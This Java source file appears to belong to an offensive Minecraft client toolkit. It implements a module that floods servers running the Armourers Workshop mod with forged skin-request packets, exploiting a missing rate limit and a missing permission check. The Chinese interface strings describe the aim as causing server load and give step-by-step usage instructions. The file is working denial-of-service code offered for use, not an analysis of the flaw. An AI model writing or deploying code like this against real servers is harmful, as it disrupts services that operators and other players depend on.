package com.redblue.red.modules.armourersworkshop;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * AW05: RequestSkinPacket (ID 1) flood - no rate limit.
 *
 * Server directly calls SkinLoader.getInstance().loadSkin() for each request,
 * then sends ResponseSkinPacket back. No rate limit, no permission check.
 *
 * Wire format (after 4-byte packetId=1):
 *   writeUtf(identifier)
 */
public class AW05_SkinRequestFlood implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("armourers_workshop", "aw-channel");
    private static final int PACKET_ID = 1;

    private long lastTick = 0;
    private int floodCounter = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger", "我了解这会造成服务端负载", false),
        ConfigParam.ofInt("batch_size", "每批请求数量", 50, 1, 500),
        ConfigParam.ofInt("interval", "自动间隔 (tick)", 1, 1, 200),
        ConfigParam.ofString("id_prefix", "标识符前缀", "nonexistent_skin_")
    );

    @Override public String id() { return "aw05_skin_request_flood"; }
    @Override public String name() { return "皮肤请求洪泛"; }
    @Override public String description() {
        return "大量发送皮肤请求造成服务端压力";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 设置每批请求数量和自动间隔\n"
            + "2. 勾选危险确认\n"
            + "3. 启用模块进行持续洪泛，或点击执行发送单批请求\n\n"
            + "[参数说明]\n"
            + "每批请求数量: 单次批量发送的皮肤请求数\n"
            + "自动间隔: 自动发送批次的tick间隔\n"
            + "标识符前缀: 请求皮肤的标识符前缀\n\n"
            + "[注意事项]\n"
            + "每个请求都会触发服务端磁盘I/O和网络响应。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("armourers_workshop");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;
        sendBatch();
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        sendBatch();
    }

    private void sendBatch() {
        int batchSize = getParam("batch_size").map(ConfigParam::getInt).orElse(50);
        String prefix = getParam("id_prefix").map(ConfigParam::getString)
                .orElse("nonexistent_skin_");

        for (int i = 0; i < batchSize; i++) {
            String identifier = prefix + floodCounter++;
            PacketForge.send(CHANNEL, buf -> {
                buf.writeInt(PACKET_ID);
                buf.writeUtf(identifier);
            });
        }
    }
}
